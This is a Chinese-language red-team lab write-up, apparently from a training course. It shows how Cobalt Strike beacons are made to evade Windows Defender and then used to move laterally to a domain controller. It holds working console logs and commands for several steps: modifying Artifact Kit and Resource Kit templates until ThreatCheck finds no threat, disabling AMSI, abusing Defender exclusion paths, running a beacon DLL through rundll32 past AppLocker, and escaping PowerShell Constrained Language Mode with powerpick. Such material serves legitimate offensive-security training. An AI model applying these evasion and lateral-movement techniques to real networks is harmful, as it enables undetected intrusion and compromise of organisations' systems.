# Bypassing Antivirus

考虑一种情况，可以遍历C盘，但是无法用psexec64和winrm64横向


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661560992096.png)

```
beacon> ls \\dc-2\c$
[*] Tasked beacon to list files in \\dc-2\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 16:37:14   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     08/16/2022 23:15:06   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/01/2022 10:51:31   Users
          dir     08/22/2022 23:14:57   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 1kb      fil     03/01/2022 10:55:07   dc-2.dev.cyberbotic.io_ca-2.req
 704mb    fil     08/27/2022 00:24:00   pagefile.sys

beacon> jump psexec64 dc-2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_dc) on dc-2 via Service Control Manager (\\dc-2\ADMIN$\f9a9ab8.exe)
[+] host called home, sent: 315465 bytes
[-] Could not start service f9a9ab8 on dc-2: 225
[-] Could not connect to pipe: 2
beacon> jump winrm64 dc-2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_dc) on dc-2 via WinRM
[+] host called home, sent: 219584 bytes
[-] Could not connect to pipe: 2
[+] received output:
#< CLIXML

```

```Get-MpThreatDetection```是一个 Windows Defender cmdlet，也可以显示检测到的威胁

```
beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources
[*] Tasked beacon to run 'Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources' on dc-2 via WinRM
[+] host called home, sent: 415 bytes
[+] received output:


ActionSuccess  : True
DomainUser     : 
ProcessName    : Unknown
Resources      : {file:_C:\Windows\bed299a.exe, file:_\\dc-2\ADMIN$\bed299a.exe}
PSComputerName : dc-2
RunspaceId     : 0a002783-760f-4f71-9114-729966d125de

ActionSuccess  : True
DomainUser     : DEV\nlamb
ProcessName    : C:\Windows\System32\wsmprovhost.exe
Resources      : {amsi:_\Device\HarddiskVolume1\Windows\System32\wsmprovhost.exe}
PSComputerName : dc-2
RunspaceId     : 0a002783-760f-4f71-9114-729966d125de

....

.....
```



wsmprovhost.exe是winrm64 尝试拿beacon

bed299a.exe是psexec64 的尝试

# Artifact Kit

用smb的listener生成一个exe的beacon：```C:\Payloads\beacon-smb-svc.exe```


使用ThreatCheck.exe对其进行检查

```
C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\ArtifactKit\dist-pipe\artifact64svcbig.exe
```

这里的扫描结果我跟教材上不一样

这是我的结果

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661562395882.png)

这是教材上的


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661562295583.png)

这里有点坑爹，因为必须根据教材上的结果扫描MSSE这个字符串才能定位到源文件

```
root@kali:/opt/cobaltstrike/artifact-kit# grep -r MSSE
src-common/bypass-pipe.c:       sprintf(pipename, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
grep: dist-pipe/artifact32big.exe: binary file matches
grep: dist-pipe/artifact64svcbig.exe: binary file matches
grep: dist-pipe/artifact32svcbig.exe: binary file matches
grep: dist-pipe/artifact64big.exe: binary file matches
grep: dist-pipe/artifact64.exe: binary file matches
grep: dist-pipe/artifact64.x64.dll: binary file matches
grep: dist-pipe/artifact32svc.exe: binary file matches
grep: dist-pipe/artifact32.exe: binary file matches
grep: dist-pipe/artifact64svc.exe: binary file matches
grep: dist-pipe/artifact32.dll: binary file matches
grep: dist-pipe/artifact64big.x64.dll: binary file matches
grep: dist-pipe/artifact32big.dll: binary file matches

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661561839445.png)

打开src-common/bypass-pipe.c这个文件，把

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661562642526.png)

修改为


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661562707133.png)

然后使用build.sh重新生成，教材视频把这几行注释掉了


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661562874980.png)

保存，执行
```
./build.sh 
```

已重新生成
```
root@kali:/opt/cobaltstrike/artifact-kit# ls -l dist-pipe/
total 2108
-rwxr-xr-x 1 root root 312334 Aug 27 01:15 artifact32big.dll
-rwxr-xr-x 1 root root 310286 Aug 27 01:15 artifact32big.exe
-rwxr-xr-x 1 root root  41998 Aug 27 01:15 artifact32.dll
-rwxr-xr-x 1 root root  39950 Aug 27 01:15 artifact32.exe
-rwxr-xr-x 1 root root 311822 Aug 27 01:15 artifact32svcbig.exe
-rwxr-xr-x 1 root root  41486 Aug 27 01:15 artifact32svc.exe
-rwxr-xr-x 1 root root 311808 Aug 27 01:15 artifact64big.exe
-rwxr-xr-x 1 root root 311808 Aug 27 01:15 artifact64big.x64.dll
-rwxr-xr-x 1 root root  41472 Aug 27 01:15 artifact64.exe
-rwxr-xr-x 1 root root 313344 Aug 27 01:15 artifact64svcbig.exe
-rwxr-xr-x 1 root root  43008 Aug 27 01:15 artifact64svc.exe
-rwxr-xr-x 1 root root  41472 Aug 27 01:15 artifact64.x64.dll
-rw-r--r-- 1 root root   3022 Aug 27 01:15 artifact.cna

```

复制到windows攻击机
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661563194517.png)

再次用threatcheck检查
```
c:\>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\ArtifactKit\dist-pipe\artifact64svcbig.exe
[+] No threat found!
[*] Run time: 0.74s

```

**这里注意，如果报access is deney，可能是ThreatCheck.exe被wd杀掉了，重新生成ThreatCheck.exe，并且把ThreatCheck.exe加到wd exlude规则里**


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661564792905.png)

但是可以横向到DC-2了


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661563363737.png)

# Resource Kit

使用winrm64横向还是会报错


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661564138404.png)

winrm主要是在内存里执行一段powershell内容

```
PS C:\Tools\cobaltstrike\ResourceKit> ls


    Directory: C:\Tools\cobaltstrike\ResourceKit


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2019   9:15 PM            205 compress.ps1
-a----         8/2/2018   2:17 AM           2979 README.txt
-a----         6/9/2020   6:31 PM           4359 resources.cna
-a----         4/3/2018   8:02 PM            830 template.exe.hta
-a----         6/9/2020   6:27 PM           2732 template.hint.x64.ps1
-a----         6/9/2020   6:26 PM           2836 template.hint.x86.ps1
-a----         4/3/2018   8:02 PM            197 template.psh.hta
-a----         6/7/2017   3:26 PM            635 template.py
-a----        3/31/2018   7:23 PM           1017 template.vbs
-a----         3/1/2022   1:51 PM           2371 template.x64.ps1
-a----         6/9/2020   6:26 PM           2479 template.x86.ps1
-a----         6/7/2017   3:26 PM           3856 template.x86.vba
```

template.x64.ps1就是jump winrm64用到的模板



```
c:\>c:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f c:\Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] Target file size: 2371 bytes
[+] Analyzing...
...
[!] Identified end of bad bytes at offset 0x703
00000000   6E 74 61 74 69 6F 6E 46  6C 61 67 73 28 27 52 75   ntationFlags('Ru
00000010   6E 74 69 6D 65 2C 20 4D  61 6E 61 67 65 64 27 29   ntime, Managed')
00000020   0A 0A 09 72 65 74 75 72  6E 20 24 76 61 72 5F 74   ···return $var_t
00000030   79 70 65 5F 62 75 69 6C  64 65 72 2E 43 72 65 61   ype_builder.Crea
00000040   74 65 54 79 70 65 28 29  0A 7D 0A 0A 49 66 20 28   teType()·}··If (
00000050   5B 49 6E 74 50 74 72 5D  3A 3A 73 69 7A 65 20 2D   [IntPtr]::size -
00000060   65 71 20 38 29 20 7B 0A  09 5B 42 79 74 65 5B 5D   eq 8) {··[Byte[]
00000070   5D 24 76 61 72 5F 63 6F  64 65 20 3D 20 5B 53 79   ]$var_code = [Sy
00000080   73 74 65 6D 2E 43 6F 6E  76 65 72 74 5D 3A 3A 46   stem.Convert]::F
00000090   72 6F 6D 42 61 73 65 36  34 53 74 72 69 6E 67 28   romBase64String(
000000A0   27 25 25 44 41 54 41 25  25 27 29 0A 0A 09 66 6F   '%%DATA%%')···fo
000000B0   72 20 28 24 78 20 3D 20  30 3B 20 24 78 20 2D 6C   r ($x = 0; $x -l
000000C0   74 20 24 76 61 72 5F 63  6F 64 65 2E 43 6F 75 6E   t $var_code.Coun
000000D0   74 3B 20 24 78 2B 2B 29  20 7B 0A 09 09 24 76 61   t; $x++) {···$va
000000E0   72 5F 63 6F 64 65 5B 24  78 5D 20 3D 20 24 76 61   r_code[$x] = $va
000000F0   72 5F 63 6F 64 65 5B 24  78 5D 20 2D 62 78 6F 72   r_code[$x] -bxor

[*] Run time: 2.4s
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661565495138.png)

思路就是替换变量名
```
$x->$i
$var_code->$apple
```

打开template.x64.ps1，把


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661565684266.png)

换成


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661565817548.png)

再次检查，已没有检测到威胁


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661565893611.png)

重新去load一次resouces.cna


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661566324482.png)

现在可以用winrm64横向到dc-2


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661566440533.png)

# AmsiScanBuffer

此章主要讲述如何绕过AMSI，课本材料提供了很多复现的技术细节

但是应用到CS上，只要在配置文件设置三行代码：
```
post-ex {
    set amsi_disable "true";
}
```

配置前：

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661676676715.png)


配置后，已经可以在dc-2使用Rubeus.exe：

1661729759471.png

# Exclusions

枚举目标主机的exlusions规则

这里教材说可以本地，也可以远程枚举，但是我只在远程枚举成功，本地枚举beacon会断掉
```
beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*
[*] Tasked beacon to run 'Get-MpPreference | select Exclusion*' on dc-2 via WinRM
[+] host called home, sent: 295 bytes
[+] received output:


ExclusionExtension : 
ExclusionIpAddress : 
ExclusionPath      : {C:\Shares\software}
ExclusionProcess   : 
PSComputerName     : dc-2
RunspaceId         : 3e755110-a816-4d15-ade2-ab157e05e7bf


[+] received output:
#< CLIXML

[+] received output:
```

1661730058127.png


上传beacon-smb.exe,使用wmi触发成功。教材也有说使用winrm触发，但是我会报错
```
beacon> cd \\dc-2\c$\shares\software
[*] cd \\dc-2\c$\shares\software
[+] host called home, sent: 33 bytes
beacon> upload C:\Payloads\beacon-smb.exe
[*] Tasked beacon to upload C:\Payloads\beacon-smb.exe as beacon-smb.exe
[+] host called home, sent: 311834 bytes
beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon-smb.exe
[*] Tasked beacon to run 'C:\Shares\Software\beacon-smb.exe' on dc-2 via WMI
[+] host called home, sent: 4400 bytes
[+] received output:
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[+] received output:
Started process 4312 on dc-2
beacon> link dc-2
[*] Tasked to link to \\dc-2\pipe\msagent_dc
[+] host called home, sent: 31 bytes
[+] established link to child beacon: 10.10.17.71
```

1661731130002.png



也可以用tcp beacon，同样使用wmi触发，然后connet目标端口

```
beacon> upload C:\Payloads\beacon-tcp-4444.exe
[*] Tasked beacon to upload C:\Payloads\beacon-tcp-4444.exe as beacon-tcp-4444.exe
[+] host called home, sent: 311839 bytes
beacon> remote-exec winrm dc-2 cmd /c C:\Shares\Software\beacon\beacon-tcp-4444.exe
[*] Tasked beacon to run 'cmd /c C:\Shares\Software\beacon\beacon-tcp-4444.exe' on dc-2 via WinRM
[+] host called home, sent: 339 bytes
[+] received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">The system cannot find the path specified._x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (The system cann...path specified.:String) [], RemoteException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NativeCommandError_x000D__x000A_</S><S S="Error">    + PSComputerName        : dc-2_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon-tcp-4444.exe
[*] Tasked beacon to run 'C:\Shares\Software\beacon-tcp-4444.exe' on dc-2 via WMI
[+] host called home, sent: 4410 bytes
[+] received output:
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[+] received output:
Started process 3464 on dc-2
beacon> connect dc-2 4444
[*] Tasked to connect to dc-2:4444
[+] host called home, sent: 15 bytes
[+] established link to child beacon: 10.10.17.71
```


1661731460113.png



## 设置自己的Exclude文件夹

```
Set-MpPreference -ExclusionPath "<path>"
```

1661731798567.png


# AppLocker Rule Bypasses

枚举applocker，教材给的例子是分析Registry.pol文件


但是如果已经有一个初始shell，那就有更简单的方法，只需要两行powershell

```
$ExecutionContext.SessionState.LanguageModeConstrainedLanguage
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

1661732327423.png


DLL 强制很少启用，因为它会给系统带来额外的负载，并且需要进行大量测试以确保不会出现任何问题

Cobalt Strike 可以将 Beacon 输出到可以使用rundll32运行的 DLL 

下面方法我在lab无法复现，因为我无法关掉dc-1的defender，这里知道有这种方法即可

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8A6C-CD61

 Directory of C:\Users\Administrator\Desktop

05/17/2021  11:01 PM    <DIR>          .
05/17/2021  11:01 PM    <DIR>          ..
05/17/2021  10:59 PM           311,808 beacon.dll

C:\>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
```

```
beacon> link dc-1
[+] established link to child beacon: 10.10.15.75
```


# PowerShell Constrained Language Mode（CLM）

枚举dc-1上是否有CLM

```
beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode
[*] Tasked beacon to run '$ExecutionContext.SessionState.LanguageMode' on dc-1 via WinRM
[+] host called home, sent: 327 bytes
[+] received output:

PSComputerName RunspaceId                           Value              
-------------- ----------                           -----              
dc-1           76353831-73f5-4234-8282-cf7125d13d6b ConstrainedLanguage

```

1661734556715.png


无法使用winrm（powershell）

1661734621007.png


在dc-1上，使用powershell会马上断开（教材在这一步是会报错）

1661734751787.png


使用powerpic代替powershell，绕过CLM限制

```
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
dc-1

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
[*] Tasked beacon to run: $ExecutionContext.SessionState.LanguageMode (unmanaged)
[+] host called home, sent: 134767 bytes
[+] received output:
FullLanguage

beacon> powerpick [math]::Pow(2,10)
[*] Tasked beacon to run: [math]::Pow(2,10) (unmanaged)
[+] host called home, sent: 134767 bytes
[+] received output:
1024

```

1661734876722.png